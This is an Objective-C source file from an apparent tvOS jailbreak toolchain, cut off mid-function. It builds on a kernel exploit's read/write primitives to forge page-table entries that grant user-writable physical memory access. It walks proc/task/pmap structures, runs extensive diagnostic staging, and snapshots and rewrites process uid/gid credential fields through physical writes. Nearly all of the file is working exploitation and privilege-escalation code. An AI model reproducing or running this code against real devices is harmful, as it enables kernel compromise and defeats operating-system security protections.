#import "dt_physrw.h"
#import "dt_misaka_offsets.h"
#import "dt_baked_offsets.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "dt_darksword_stages.h"
#import "DTRunLogger.h"
#import "dt_session_probe.h"
#import "stubs/dt_pmap_probe.h"

#import <physrw_pte.h>
#import <translation.h>
#import <info.h>
#import <primitives.h>
#import <pte.h>
#import <trustcache.h>
#import <kalloc_pt.h>
#import <trustcache_structs.h>
#import <choma/MachO.h>
#import <choma/Fat.h>
#import <choma/FileStream.h>
#import <choma/MemoryStream.h>
#import <choma/CSBlob.h>
#import <choma/CodeDirectory.h>
#import <uuid/uuid.h>
#import <kernel.h>
#import <codesign.h>
#import <mach/mach.h>

/// IDA §26 / §28 — task+0x300 itk_space @ 200D38; ipc_port+0x48 kobject @ 200AF0.
typedef struct {
    uint64_t task_kptr;
    uint64_t task_pmap;
    uint64_t itk_space_off;
    uint64_t itk_space_kptr;
    uint64_t ipc_entry;
    uint64_t port_obj;
    uint64_t kobject_off;
    uint64_t thread_kptr;
} dt_b101_thread_diag_t;

static uint32_t dt_b101_task_itk_space_off(void)
{
    uint32_t off = koffsetof(task, itk_space);
    if (off)
        return off;
    if (g_misaka_offsets.off_task_itk_space)
        return g_misaka_offsets.off_task_itk_space;
    return 0x300;
}

static uint32_t dt_b101_ipc_port_kobject_off(void)
{
    uint32_t off = koffsetof(ipc_port, kobject);
    if (off)
        return off;
    return 0x48;
}

static uint64_t dt_b101_thread_kptr_from_port(uint64_t task, mach_port_t port,
                                              dt_b101_thread_diag_t *diag_out)
{
    dt_b101_thread_diag_t d = {0};
    d.task_kptr = task;
    d.itk_space_off = dt_b101_task_itk_space_off();
    d.kobject_off = dt_b101_ipc_port_kobject_off();

    if (!task || port == MACH_PORT_NULL) {
        if (diag_out)
            *diag_out = d;
        return 0;
    }

    d.itk_space_kptr = kread_ptr(task + d.itk_space_off);
    if (!d.itk_space_kptr)
        goto out;

    d.ipc_entry = ipc_entry_lookup(d.itk_space_kptr, port);
    if (!d.ipc_entry)
        goto out;

    d.port_obj = kread_ptr(d.ipc_entry + koffsetof(ipc_entry, object));
    if (!d.port_obj)
        goto out;

    d.thread_kptr = kread_ptr(d.port_obj + d.kobject_off);

out:
    if (diag_out)
        *diag_out = d;
    return d.thread_kptr;
}
#import <Foundation/Foundation.h>
#import <mach-o/loader.h>
#import <unistd.h>
#import <string.h>
#import <stdarg.h>
#import <errno.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <fcntl.h>

static void DTPhysLogBridge(const char *line)
{
    if (line) dt_run_log("%s", line);
}

static void DTPhysStageBridge(const char *stage)
{
    dt_session_probe_phys_stage(stage);
}

static void DTPhysLog(void (^log)(NSString *line), NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [[DTRunLogger shared] log:line];
    if (log) log(line);
}

extern void flush_tlb(void);
extern int pmap_expand_range(uint64_t pmap, uint64_t vaStart, uint64_t size);

static BOOL DTPhysKfdCanonicalVA(uint64_t va)
{
    return va >= 0xfffff00000000000ULL;
}

static void DTPhysStage(NSString *stage)
{
    if (!stage)
        return;
    [[DTRunLogger shared] logStage:stage];
    dt_session_probe_phys_stage([stage UTF8String]);
}

static int DTPhysCheckedKread64(uint64_t va, uint64_t *value, NSString *tag, void (^log)(NSString *line))
{
    if (value)
        *value = 0;
    if (!value)
        return -90;
    if (!DTPhysKfdCanonicalVA(va)) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_READ_%@", tag ?: @"unknown"]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_READ %@ va=0x%llx",
            tag ?: @"unknown", va);
        return -91;
    }
    if (!gPrimitives.kreadbuf) {
        DTPhysStage(@"BUILD102711_PHYSRW_LOCAL_HANDOFF_NO_KREAD");
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_NO_KREAD");
        return -92;
    }

    /* App-local KFD T _kreadbuf shadows dylib kreadbuf; use active producer. */
    int r = gPrimitives.kreadbuf(va, value, sizeof(*value));
    if (r != 0) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_READ_FAIL_%@", tag ?: @"unknown"]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_READ_FAIL %@ va=0x%llx r=%d",
            tag ?: @"unknown", va, r);
        return -93;
    }
    return 0;
}

static int DTPhysCheckedKreadPtr(uint64_t va, uint64_t *value, NSString *tag, void (^log)(NSString *line))
{
    uint64_t raw = 0;
    int r = DTPhysCheckedKread64(va, &raw, tag, log);
    if (r != 0)
        return r;

    uint64_t ptr = UNSIGN_PTR(raw);
    if (!DTPhysKfdCanonicalVA(ptr)) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_PTR_%@", tag ?: @"unknown"]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_PTR %@ raw=0x%llx ptr=0x%llx",
            tag ?: @"unknown", raw, ptr);
        return -94;
    }

    *value = ptr;
    return 0;
}

static int DTPhysCurrentProcTask(uint64_t proc, uint64_t *taskOut, void (^log)(NSString *line))
{
    if (!taskOut)
        return -100;
    *taskOut = 0;

    uint64_t taskOff = koffsetof(proc, task);
    if (taskOff) {
        int r = DTPhysCheckedKreadPtr(proc + taskOff, taskOut, @"proc_task", log);
        if (r != 0)
            return -101;
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_TASK_READ=0x%llx", *taskOut]);
        return 0;
    }

    uint64_t procSize = ksizeof(proc);
    if (!procSize) {
        DTPhysStage(@"BUILD102711_PHYSRW_LOCAL_HANDOFF_PROC_SIZE_MISSING");
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_PROC_SIZE_MISSING");
        return -102;
    }

    uint64_t task = proc + procSize;
    if (task <= proc || !DTPhysKfdCanonicalVA(task)) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_INLINE_TASK=0x%llx", task]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_INLINE_TASK proc=0x%llx size=0x%llx task=0x%llx",
            proc, procSize, task);
        return -103;
    }

    *taskOut = task;
    DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_TASK_INLINE=0x%llx", task]);
    return 0;
}

typedef struct {
    uint64_t proc;
    uint64_t task;
    uint64_t map;
    uint64_t pmap;
    uint64_t tte;
    uint64_t ttep;
    uint64_t phystokv_ttep;
    BOOL invariant_pass;
    const char *fail_step;
} dt_phys712_chain_t;

static int DTPhys712SafeKread64(uint64_t va, uint64_t *value)
{
    if (!value)
        return -1;
    *value = 0;
    if (!DTPhysKfdCanonicalVA(va) || !gPrimitives.kreadbuf)
        return -1;
    /* App-local KFD T _kreadbuf shadows dylib kreadbuf; use active producer. */
    return gPrimitives.kreadbuf(va, value, sizeof(*value));
}

static int DTPhys712SafeKreadPtr(uint64_t va, uint64_t *value)
{
    uint64_t raw = 0;
    if (DTPhys712SafeKread64(va, &raw) != 0)
        return -1;
    uint64_t ptr = UNSIGN_PTR(raw);
    if (!DTPhysKfdCanonicalVA(ptr))
        return -1;
    *value = ptr;
    return 0;
}

static int DTPhys712ProcTaskInline(uint64_t proc, uint64_t *taskOut)
{
    if (!taskOut)
        return -1;
    *taskOut = 0;

    uint64_t taskOff = koffsetof(proc, task);
    if (taskOff) {
        if (DTPhys712SafeKreadPtr(proc + taskOff, taskOut) != 0)
            return -1;
        return 0;
    }

    uint64_t procSize = ksizeof(proc);
    if (!procSize)
        return -1;

    uint64_t task = proc + procSize;
    if (task <= proc || !DTPhysKfdCanonicalVA(task))
        return -1;

    *taskOut = task;
    return 0;
}

static uint64_t DTPhys713DiagPhysToKv(uint64_t pa)
{
    if (!gPrimitives.phystokv)
        return 0;
    return gPrimitives.phystokv(pa);
}

static void DTPhys712WalkFromProc(uint64_t proc, BOOL use_lib_proc_task, dt_phys712_chain_t *out)
{
    memset(out, 0, sizeof(*out));
    out->proc = proc;
    out->fail_step = "none";

    if (!proc || !DTPhysKfdCanonicalVA(proc)) {
        out->fail_step = "proc";
        return;
    }

    uint64_t task = 0;
    if (use_lib_proc_task) {
        task = proc_task(proc);
        if (!task || !DTPhysKfdCanonicalVA(task)) {
            out->fail_step = "task";
            return;
        }
    } else if (DTPhys712ProcTaskInline(proc, &task) != 0) {
        out->fail_step = "task";
        return;
    }
    out->task = task;

    uint64_t vmMap = 0;
    if (DTPhys712SafeKreadPtr(task + koffsetof(task, map), &vmMap) != 0) {
        out->fail_step = "map";
        return;
    }
    out->map = vmMap;

    uint64_t pmap = 0;
    if (DTPhys712SafeKreadPtr(vmMap + koffsetof(vm_map, pmap), &pmap) != 0) {
        out->fail_step = "pmap";
        return;
    }
    out->pmap = pmap;

    if (DTPhys712SafeKread64(pmap + koffsetof(pmap, tte), &out->tte) != 0) {
        out->fail_step = "tte";
        return;
    }

    if (DTPhys712SafeKread64(pmap + koffsetof(pmap, ttep), &out->ttep) != 0) {
        out->fail_step = "ttep";
        return;
    }

    if (!gPrimitives.phystokv) {
        out->fail_step = "phystokv_fn";
        return;
    }

    out->phystokv_ttep = DTPhys713DiagPhysToKv(out->ttep);
    out->invariant_pass = (out->tte == out->phystokv_ttep);
}

static const char *DTPhys712FirstDivergence(const dt_phys712_chain_t *kfd, const dt_phys712_chain_t *pf)
{
    if (kfd->proc != pf->proc)
        return "proc";
    if (kfd->task != pf->task)
        return "task";
    if (kfd->map != pf->map)
        return "map";
    if (kfd->pmap != pf->pmap)
        return "pmap";
    if (kfd->tte != pf->tte)
        return "tte";
    if (kfd->ttep != pf->ttep)
        return "ttep";
    return "none";
}

static const char *DTPhys712WrongProcTheory(const dt_phys712_chain_t *kfd, const dt_phys712_chain_t *pf,
                                            const char *divergence)
{
    if (strcmp(divergence, "none") == 0)
        return "DISPROVEN";
    if (strcmp(divergence, "proc") == 0) {
        if (!kfd->invariant_pass && pf->invariant_pass)
            return "PROVEN";
        return "PARTIAL";
    }
    if (!kfd->invariant_pass && pf->invariant_pass)
        return "PARTIAL";
    if (kfd->invariant_pass != pf->invariant_pass)
        return "PARTIAL";
    return "PARTIAL";
}

static const char *DTPhys712RecommendedFix(const char *theory, const char *divergence,
                                           const dt_phys712_chain_t *kfd, const dt_phys712_chain_t *pf)
{
    if (strcmp(theory, "DISPROVEN") == 0) {
        if (!kfd->invariant_pass && !pf->invariant_pass)
            return "investigate_pmap_root_invariant_not_proc_resolution";
        return "investigate_expand_or_pmap_semantics_same_proc_chain";
    }
    if (strcmp(theory, "PROVEN") == 0)
        return "handoff_use_proc_find_not_dt_kfd_current_proc";
    if (strcmp(divergence, "task") == 0)
        return "compare_inline_task_vs_proc_task_before_handoff_change";
    if (strcmp(divergence, "map") == 0 || strcmp(divergence, "pmap") == 0)
        return "verify_task_map_offsets_same_session";
    if (strcmp(divergence, "tte") == 0 || strcmp(divergence, "ttep") == 0) {
        if (kfd->pmap == pf->pmap)
            return "same_pmap_bad_invariant_investigate_tte_field_semantics";
        return "handoff_use_proc_find_chain_if_pf_invariant_pass";
    }
    if (!kfd->invariant_pass && pf->invariant_pass)
        return "handoff_use_proc_find_not_dt_kfd_current_proc";
    return "collect_second_device_run_before_handoff_change";
}

static void DTPhys712EmitChainMarkers(const char *tag, const dt_phys712_chain_t *chain)
{
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_PROC=0x%llx", tag, chain->proc]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_TASK=0x%llx", tag, chain->task]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_MAP=0x%llx", tag, chain->map]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_PMAP=0x%llx", tag, chain->pmap]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_TTE=0x%llx", tag, chain->tte]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_TTEP=0x%llx", tag, chain->ttep]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_PHYSTOKV=0x%llx", tag, chain->phystokv_ttep]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_INVARIANT=%@",
        tag, chain->invariant_pass ? @"PASS" : @"FAIL"]);
    if (chain->fail_step && strcmp(chain->fail_step, "none") != 0) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_%@_WALK_FAIL=%s", tag, chain->fail_step]);
    }
}

static void DTPhys712RunProcRouteDiag(void (^log)(NSString *line))
{
    (void)log;
    DTPhysStage(@"BUILD102713_DIAG_BEGIN");

    dt_phys712_chain_t kfdChain = {0};
    dt_phys712_chain_t pfChain = {0};

    uint64_t procKfd = dt_kfd_current_proc();
    uint64_t procFind = proc_find(getpid());

    DTPhys712WalkFromProc(procKfd, NO, &kfdChain);
    DTPhys712WalkFromProc(procFind, YES, &pfChain);
    if (procFind)
        proc_rele(procFind);

    DTPhys712EmitChainMarkers(@"KFD", &kfdChain);
    DTPhys712EmitChainMarkers(@"PROCFIND", &pfChain);

    const char *divergence = DTPhys712FirstDivergence(&kfdChain, &pfChain);
    const char *theory = DTPhys712WrongProcTheory(&kfdChain, &pfChain, divergence);
    const char *fix = DTPhys712RecommendedFix(theory, divergence, &kfdChain, &pfChain);

    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_PROC_MATCH=%@",
        (kfdChain.proc && pfChain.proc && kfdChain.proc == pfChain.proc) ? @"YES" : @"NO"]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_WRONG_PROC_THEORY=%s", theory]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_FIRST_CHAIN_DIVERGENCE=%s", divergence]);
    DTPhysStage([NSString stringWithFormat:@"BUILD102713_DIAG_RECOMMENDED_FIX=%s", fix]);
    DTPhysStage(@"BUILD102713_DIAG_END");
}

static int DTPhysPteInitFromCurrentProc(void (^log)(NSString *line))
{
    DTPhysStage(@"BUILD102711_PHYSRW_LOCAL_HANDOFF_BEGIN");

    uint64_t proc = dt_kernel_exploit_current_proc();
    if (!DTPhysKfdCanonicalVA(proc)) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_PROC=0x%llx", proc]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_PROC proc=0x%llx", proc);
        return -31;
    }
    DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_PROC=0x%llx", proc]);

    uint64_t task = 0;
    int r = DTPhysCurrentProcTask(proc, &task, log);
    if (r != 0)
        return -32;

    uint64_t vmMap = 0;
    r = DTPhysCheckedKreadPtr(task + koffsetof(task, map), &vmMap, @"task_map", log);
    if (r != 0)
        return -33;
    DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_MAP=0x%llx", vmMap]);

    uint64_t pmap = 0;
    r = DTPhysCheckedKreadPtr(vmMap + koffsetof(vm_map, pmap), &pmap, @"vm_map_pmap", log);
    if (r != 0)
        return -34;
    DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_PMAP=0x%llx", pmap]);

    uint64_t ttep = 0;
    r = DTPhysCheckedKread64(pmap + koffsetof(pmap, ttep), &ttep, @"pmap_ttep", log);
    if (r != 0)
        return -35;
    if (!ttep || ((ttep & 0xf000000000000000ULL) && !DTPhysKfdCanonicalVA(ttep))) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_TTEP=0x%llx", ttep]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_BAD_TTEP ttep=0x%llx", ttep);
        return -35;
    }
    DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_TTEP=0x%llx", ttep]);

    uint64_t magicPTAddress = L1_BLOCK_SIZE * (L1_BLOCK_COUNT - 1);
    int exp_r = pmap_expand_range(pmap, magicPTAddress, L2_BLOCK_SIZE);
    if (exp_r != 0) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_EXPAND_FAIL_%d", exp_r]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_EXPAND_FAIL r=%d", exp_r);
        return -36;
    }
    DTPhysStage(@"BUILD102711_PHYSRW_LOCAL_HANDOFF_EXPAND_PASS");

    uint64_t leafLevel = PMAP_TT_L2_LEVEL;
    uint64_t magicPT = vtophys_lvl(ttep, magicPTAddress, &leafLevel, NULL);
    if (!magicPT) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_MAGIC_PT_FAIL level=%llu errno=%d",
            leafLevel, errno]);
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_MAGIC_PT_FAIL level=%llu errno=%d",
            leafLevel, errno);
        return -37;
    }
    DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_MAGIC_PT=0x%llx", magicPT]);

    uint64_t magicEntry = magicPT | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
    r = physwrite64(magicPT, magicEntry);
    if (r != 0) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_MAGIC_WRITE_FAIL_%d", r]);
        return -38;
    }

    uint64_t swAsid = pmap + koffsetof(pmap, sw_asid);
    uint64_t swAsidPage = swAsid & ~vm_real_kernel_page_mask;
    uint64_t swAsidPagePA = kvtophys(swAsidPage);
    uint64_t swAsidPageOff = swAsid & vm_real_kernel_page_mask;
    if (!swAsidPagePA) {
        DTPhysStage(@"BUILD102711_PHYSRW_LOCAL_HANDOFF_SW_ASID_PA_FAIL");
        DTPhysLog(log, @"[!] BUILD102711_PHYSRW_LOCAL_HANDOFF_SW_ASID_PA_FAIL sw_asid=0x%llx", swAsid);
        return -39;
    }

    uint64_t swAsidEntry = swAsidPagePA | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
    r = physwrite64(magicPT + sizeof(uint64_t), swAsidEntry);
    if (r != 0) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_SW_ASID_WRITE_FAIL_%d", r]);
        return -40;
    }

    uint64_t swAsidPtr = magicPTAddress + vm_real_kernel_page_size + swAsidPageOff;
    DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_SW_ASID_PTR=0x%llx", swAsidPtr]);

    r = libjailbreak_physrw_pte_init(true, swAsidPtr);
    if (r != 0) {
        DTPhysStage([NSString stringWithFormat:@"BUILD102711_PHYSRW_LOCAL_HANDOFF_INIT_FAIL_%d", r]);
        return -41;
    }

    flush_tlb();
    DTPhysStage(@"BUILD102711_PHYSRW_LOCAL_HANDOFF_PASS");
    return 0;
}

static BOOL DTPhys716PhysReady(void)
{
    return gPrimitives.physreadbuf != NULL
        && gPrimitives.physwritebuf != NULL
        && gPrimitives.vtophys != NULL
        && dt_kernel_exploit_is_active();
}

bool dt_phys716_phys_ready(void)
{
    return DTPhys716PhysReady();
}

static int DTPhys716ReadySmokeTest(void (^log)(NSString *line))
{
    uint64_t kbase = gSystemInfo.kernelConstant.base;
    uint64_t pa = kvtophys(kbase);
    uint32_t p_magic = pa ? (uint32_t)physread64(pa) : 0;
    if (!pa || p_magic != MH_MAGIC_64) {
        DTPhysLog(log, @"[!] BUILD102716 physrw ready smoke fail kbase=0x%llx pa=0x%llx magic=0x%x",
            kbase, pa, p_magic);
        return -1;
    }
    return 0;
}

int dt_build_physrw_handoff_only(void (^log)(NSString *line))
{
    if (!dt_kernel_exploit_is_active()) {
        DTPhysLog(log, @"[!] handoff: kernel exploit not active");
        return -1;
    }
    if (!g_dt_baked_offsets_active) {
        DTPhysLog(log, @"[!] handoff: baked tvOS offsets not active");
        return -2;
    }

    // Ownership (tvOS 16.5 R24 / handoff516):
    // - Pre-exploit (dt_exploit_lifecycle): hardcoded + DTApplyTvOSInpcbOverrides so
    //   DarkSword can use koffsetof(inpcb/socket/protosw) before KRW exists.
    // - Post-exploit (here): hardcoded again resets Darwin-generic pmap/proc/etc.,
    //   then TV overrides re-assert 20L563 layouts, then boot_constants reads KRW.
    // Dopamine 3.x only runs hardcoded once pre-exploit; we keep this second pass
    // because TV overrides must undo hardcoded's iOS-shaped struct defaults.
    // Burn #1 crash was ABI (gSystemInfo tail vs gPrimitives), not redundant init.
    jbinfo_initialize_hardcoded_offsets();
    DTApplyTvOSInpcbOverrides();
    dt_misaka_offsets_init();
    DTApplyTvOSPmapStructOverrides();
    DTApplyTvOSTrustcacheOverrides();
    DTApplyTvOSProcStructOverrides();
    dt_physrw_set_log_fn(DTPhysLogBridge);
    dt_physrw_set_stage_fn(DTPhysStageBridge);

    gSystemInfo.kernelConstant.slide = dt_kernel_exploit_slide();
    gSystemInfo.kernelConstant.base = gSystemInfo.kernelConstant.staticBase + gSystemInfo.kernelConstant.slide;

    uint64_t kv = ksymbol(gVirtBase);
    if (kv < 0xfffff00000000000ULL) {
        [[DTRunLogger shared] logStage:@"handoff ksymbol invalid"];
        DTPhysLog(log, @"[!] handoff: ksymbol(gVirtBase)=0x%llx invalid", kv);
        return -8;
    }

    jbinfo_initialize_boot_constants();

    if (!gSystemInfo.kernelConstant.physBase || !gSystemInfo.kernelConstant.physSize || !gSystemInfo.kernelConstant.cpuTTEP) {
        [[DTRunLogger shared] logStage:@"handoff boot constants invalid"];
        DTPhysLog(log, @"[!] handoff: physBase/physSize/cpuTTEP zero");
        return -3;
    }
    dt_ds_stage("DS10 BOOT_CONSTANTS_OK");

    libjailbreak_translation_init();
    dt_ds_stage("DS11 TRANSLATION_OK");
    dt_ds_stage("DS12 IOSURFACE_PRIMS_OK=SKIPPED_TVOS");
    if (is_kcall_available())
        dt_ds_stage("DS13 ARM64_KCALL_OK");
    else
        dt_ds_stage("DS13 ARM64_KCALL_DEFERRED");

    // R24 historically gated on dt_pte_kwrite_perf_is_ready() (g_pte_kwrite64 != NULL),
    // wired only from the KFD producer site via dt_pte_kwrite_register_perf().
    // Exhaustive IPA proof (Burn #2): zero callers of dt_pte_kwrite64 in app/dylib;
    // registered callback == unregistered fallback (both kwrite64 → gPrimitives.kwritebuf);
    // dt_pte_kwrite.c not linked; DT_POST_KOPEN_PTE=0; stock Dopamine 2/3 have no latch.
    // Cold physrw uses gPrimitives / physwrite64 / libjailbreak_physrw_pte_init only.
    // Latch removed as dead/redundant policy — not bypassed for DarkSword specifically.

    if (!device_supports_physrw_pte()) {
        [[DTRunLogger shared] logStage:@"handoff pte unsupported"];
        return -5;
    }

    DTPhysStage(@"BUILD102716_PHYSRW_STATE_CHECK");

    if (DTPhys716PhysReady()) {
        DTPhysStage(@"BUILD102716_PHYSRW_ALREADY_READY");
        if (DTPhys716ReadySmokeTest(log) == 0) {
            DTPhysStage(@"BUILD102716_PHYSRW_READY_SMOKE_PASS");
            DTPhysStage(@"BUILD102716_PHYSRW_SKIP_HANDOFF_PASS");
            dt_session_probe_physrw_init_enter();
            dt_session_probe_physrw_init_exit(0);
            [[DTRunLogger shared] logStage:@"handoff OK"];
            return 0;
        }
        DTPhysStage(@"BUILD102716_PHYSRW_READY_SMOKE_FAIL");
        if (!gPrimitives.kreadbuf) {
            DTPhysLog(log, @"[!] BUILD102716 physrw ready smoke failed and raw kread unavailable");
            dt_session_probe_physrw_init_enter();
            dt_session_probe_physrw_init_exit(-716);
            return -716;
        }
    }

    DTPhysStage(@"BUILD102716_PHYSRW_COLD_INIT_REQUIRED");

    DTPhys712RunProcRouteDiag(log);

    dt_session_probe_physrw_init_enter();
    int r = DTPhysPteInitFromCurrentProc(log);
    if (r != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"handoff pte init failed %d", r]];
        dt_session_probe_physrw_init_exit(r);
        return r;
    }

    if (!gPrimitives.physwritebuf || !gPrimitives.vtophys) {
        [[DTRunLogger shared] logStage:@"handoff primitives missing"];
        dt_session_probe_physrw_init_exit(-4);
        return -4;
    }

    uint64_t kbase = gSystemInfo.kernelConstant.base;
    uint64_t pa = kvtophys(kbase);
    uint32_t p_magic = pa ? (uint32_t)physread64(pa) : 0;
    if (!pa || p_magic != MH_MAGIC_64) {
        [[DTRunLogger shared] logStage:@"handoff physread smoke failed"];
        dt_session_probe_physrw_init_exit(-9);
        return -9;
    }

    [[DTRunLogger shared] logStage:@"handoff OK"];
    dt_session_probe_physrw_init_exit(0);
    return 0;
}

typedef struct {
    uint64_t proc;
    uint64_t ucred;
    uint64_t posix;
    uint32_t proc_svuid;
    uint32_t proc_svgid;
    uint32_t cr_uid;
    uint32_t cr_ruid;
    uint32_t cr_svuid;
    uint32_t cr_rgid;
    uint32_t cr_svgid;
    uint32_t cr_groups;
    BOOL valid;
} dt_phys_cred_snap_t;

static int dt_phys_cred_require_ready(void (^log)(NSString *line))
{
    if (!gPrimitives.physwritebuf || !gPrimitives.physreadbuf || !gPrimitives.vtophys) {
        DTPhysLog(log, @"[!] phys cred: physread=%p physwrite=%p vtophys=%p",
            gPrimitives.physreadbuf, gPrimitives.physwritebuf, gPrimitives.vtophys);
        return -2;
    }
    if (gPrimitives.kwritebuf) {
        DTPhysLog(log, @"[!] phys cred: expected kwritebuf=NULL after handoff (have %p)", gPrimitives.kwritebuf);
        return -2;
    }
    return 0;
}

static BOOL dt_phys_cred_snap_fill(dt_phys_cred_snap_t *snap, uint64_t proc, const dt_misaka_offsets_t *o)
{
    memset(snap, 0, sizeof(*snap));
    snap->proc = proc;

    uint64_t proc_ro = kread64(proc + o->off_p_proc_ro);
    snap->ucred = kread64(proc_ro + o->off_p_ro_p_ucred);
    if (!proc_ro || !snap->ucred)
        return NO;

    snap->posix = snap->ucred + o->off_u_cr_posix;
    snap->proc_svuid = kread32(proc + o->off_p_svuid);
    snap->proc_svgid = kread32(proc + o->off_p_svgid);
    snap->cr_uid = kread32(snap->posix + o->off_cr_uid);
    snap->cr_ruid = kread32(snap->posix + o->off_cr_ruid);
    snap->cr_svuid = kread32(snap->posix + o->off_cr_svuid);
    snap->cr_rgid = kread32(snap->posix + o->off_cr_rgid);
    snap->cr_svgid = kread32(snap->posix + o->off_cr_svgid);
    snap->cr_groups = kread32(snap->posix + o->off_cr_groups);
    snap->valid = YES;
    return YES;
}

static int dt_phys_write32_va(uint64_t va, uint32_t val, const char *tag, void (^log)(NSString *line))
{
    uint64_t pa = kvtophys(va);
    if (!pa) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build25 kvtophys %s failed", tag]];
        return -4;
    }
    if (physwrite32(pa, val) != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build25 physwrite %s failed", tag]];
        return -5;
    }

    uint32_t after_kread = kread32(va);
    uint32_t after_phys = physread32(pa);
    if (after_kread != val || after_phys != val) {
        DTPhysLog(log, @"[!] build25 verify %s kread=0x%x phys=0x%x want=0x%x",
            tag, after_kread, after_phys, val);
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build25 verify %s failed", tag]];
        return -6;
    }
    return 0;
}

int dt_phys_read8_va(uint64_t va, uint8_t *out, void (^log)(NSString *line))
{
    (void)log;
    if (!out)
        return -1;
    uint64_t aligned = va & ~3ULL;
    uint32_t word = kread32(aligned);
    unsigned shift = (unsigned)((va & 3ULL) * 8ULL);
    *out = (uint8_t)((word >> shift) & 0xFFU);
    return 0;
}

int dt_phys_write8_va_rm(uint64_t va, uint8_t val, const char *tag, void (^log)(NSString *line))
{
    uint64_t aligned = va & ~3ULL;
    unsigned shift = (unsigned)((va & 3ULL) * 8ULL);
    uint32_t word = kread32(aligned);
    uint32_t mask = 0xFFU << shift;
    uint32_t new_word = (word & ~mask) | ((uint32_t)val << shift);
    return dt_phys_write32_va(aligned, new_word, tag, log);
}

static void dt_phys_cred_snap_restore(const dt_phys_cred_snap_t *snap, const dt_misaka_offsets_t *o,
    void (^log)(NSString *line))
{
    if (!snap || !snap->valid)
        return;

    const char *fail_tag = NULL;
    if (dt_phys_write32_va(snap->proc + o->off_p_svuid, snap->proc_svuid, "restore proc_svuid", log) != 0)
        fail_tag = "proc_svuid";
    else if (dt_phys_write32_va(snap->posix + o->off_cr_svuid, snap->cr_svuid, "restore cr_svuid", log) != 0)
        fail_tag = "cr_svuid";
    else if (dt_phys_write32_va(snap->posix + o->off_cr_ruid, snap->cr_ruid, "restore cr_ruid", log) != 0)
        fail_tag = "cr_ruid";
    else if (dt_phys_write32_va(snap->posix + o->off_cr_uid, snap->cr_uid, "restore cr_uid", log) != 0)
        fail_tag = "cr_uid";
    else if (dt_phys_write32_va(snap->proc + o->off_p_svgid, snap->proc_svgid, "restore proc_svgid", log) != 0)
        fail_tag = "proc_svgid";
    else if (dt_phys_write32_va(snap->posix + o->off_cr_rgid, snap->cr_rgid, "restore cr_rgid", log) != 0)
        fail_tag = "cr_rgid";
